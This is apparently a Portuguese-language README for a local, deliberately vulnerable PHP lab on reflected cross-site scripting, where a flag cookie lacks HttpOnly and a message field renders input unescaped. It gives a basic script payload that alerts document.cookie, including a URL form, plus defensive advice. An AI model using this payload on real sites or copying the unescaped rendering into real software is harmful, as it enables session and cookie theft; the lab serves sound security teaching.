# XSS Cookie Lab - PHP

Laboratório local e intencionalmente vulnerável para estudar Cross-Site Scripting refletido e leitura de cookies com `document.cookie`.

A aplicação cria um cookie chamado `flag` sem `HttpOnly`. O campo de mensagem renderiza a entrada do usuário sem escape, permitindo executar JavaScript no navegador.

## Rodando com Docker Compose ou Podman compatível

```bash
FLAG_COOKIE='ACT{aluno-001}' docker compose up --build
```

Acesse:

```text
http://localhost:5000
```

## Rodando com Podman sem Compose

```bash
podman build -t xss-cookie-lab-php .
podman run --rm -p 5000:80 -e FLAG_COOKIE='ACT{aluno-001}' xss-cookie-lab-php
```

## Teste normal

No campo de mensagem:

```text
Olá, mundo!
```

## Payload XSS

No campo de mensagem:

```html
<script>alert(document.cookie)</script>
```

Você também pode testar direto pela URL:

```text
http://localhost:5000/?message=<script>alert(document.cookie)</script>
```

O alerta deve exibir o cookie da flag, por exemplo:

```text
flag=ACT{aluno-001}
```

## Observação de segurança

Este projeto é propositalmente vulnerável. Use somente em ambiente local ou controlado.

Em aplicações reais:

- Escape a saída antes de renderizar dados do usuário no HTML.
- Use cookies sensíveis com `HttpOnly`, `Secure` e `SameSite` adequado.
- Considere uma Content Security Policy adequada.
